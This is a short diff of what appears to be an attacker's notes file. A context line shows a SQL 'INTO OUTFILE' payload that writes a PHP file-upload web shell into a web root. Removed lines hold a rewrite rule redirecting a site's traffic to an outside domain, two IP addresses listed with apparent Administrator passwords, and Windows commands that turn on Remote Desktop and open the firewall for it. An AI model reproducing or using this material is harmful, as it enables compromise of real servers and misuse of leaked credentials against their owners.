@@ -2,16 +2,3 @@ SELECT
 "<?php echo \'<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">\';echo \'<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>\'; if( $_POST[\'_upl\'] == \"Upload\" ) { if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Done.<b><br><br>\'; }else { echo \'<b>Upload Failed.</b><br><br>\'; }}?>"
  INTO OUTFILE 'opt/lampp/htdocs/proxy.php';
 
-RewriteRule ^(.*)$ https://madmasaleh.com/$1 [R,L]
-
-124.158.13.213
-Password for Administrator is: Lxk2zoFt
-
-================================
-
-36.91.103.194
-Password for Administrator is: 5LVzfRKa
-
-reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
-
-netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
